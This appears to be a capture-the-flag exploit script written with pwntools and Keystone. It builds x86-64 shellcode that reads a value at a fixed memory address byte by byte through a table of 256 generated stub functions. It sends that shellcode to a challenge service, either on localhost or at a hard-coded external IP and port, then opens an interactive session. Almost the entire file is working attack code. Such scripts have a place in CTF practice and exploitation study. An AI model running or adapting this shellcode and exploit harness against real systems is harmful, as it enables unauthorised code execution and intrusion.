from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "52.192.42.215"
    port = 9427
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, '\x00'))

r = remote(host, port)

def recvuntil(x, verbose=True):
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)

def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s

def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip('\n')

def sendline(s, verbose=True):
    if log and verbose:
        pass
        #print(s)
    r.sendline(s)

def send(s, verbose=True):
    if log and verbose:
        print(s, end='')
    r.send(s)

def interactive():
    r.interactive()

####################################

def menu(choice):
    recvuntil(':')
    sendline(str(choice))

# receive and send
def rs(s, new_line=True, r=':'):
    recvuntil(r)
    s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)

from keystone import *

ks = Ks(KS_ARCH_X86, KS_MODE_64)

def asm(code):
    bcode, _ = ks.asm(code)
    return ''.join(map(chr, bcode))


#shellcode = ''
#shellcode += asm('mov rdi,0x02170000')
#shellcode += asm('mov r13,[rdi]')
#shellcode += asm('mov [rdi],r13')
#shellcode += asm('mov rdi,0x02170000')
#shellcode += asm('xor eax, eax')
#shellcode += asm('mov ecx,0x200')
#shellcode += asm('rep stos QWORD PTR es:[rdi],rax')
#shellcode += asm('mov rdi,0x02170000')
#shellcode += asm('mov ecx,0x200')
#shellcode += asm('xor eax, eax')
#shellcode += exit


funcs = ''
for i in range(256):
    funcs += asm('mov bl, {}'.format(i))
    funcs += asm('ret')


BASE = 0xdead0080 + 401
# base register rdx
head = '''\
mov rdi, 0x02170000
mov rdx, [rdi]
mov rsp, 0x02170028
mov r12, {}
mov rsi, 0
mov [rdi], rsi
mov rdi, 0x02170000
'''.format(hex(BASE))

body = ''
for i in range(8):
    body += '\n'.join([
        'mov rcx, rdx',
        'and rcx, 0xff',
        'lea rcx, [rcx+2*rcx+0]', # rcx = 3 * rcx
        'lea rax, [r12+1*rcx+0]', # rax = base + rcx
        'mov rbx, 0',
        'or rsi, rbx',
        'shl rbx, {}'.format(i * 8),
        'call rax',
        'shr rdx, 8'
        ]) + '\n'

exit = '''\
mov rsp, 0x02170028
mov rax, 0xdead0100
mov rax, 0x2170020
mov [rax], r9
mov rax, 0x2170000
mov [rax], r9
mov rax, 0x2170000
mov rax, 0x3c
syscall
'''
#exit = '\xB8\x3C\x00\x00\x00\x0F\x05'

code = head + body + exit

main = ''.join(map(asm, code.strip('\n').split('\n')))
print('BASE =', len(main))

shellcode = ''
shellcode += main
shellcode += funcs

print('len', len(shellcode))

recvuntil('2000)')
sendline(str(len(shellcode)))
recvuntil('bytes..')
sendline(shellcode)

with open('dump', 'w') as f:
    f.write('{}\n'.format(len(shellcode)))
    f.write(shellcode)


#print(recvuntil('t.'))
#print(recvuntil('con'))
#print(recvline())
interactive()
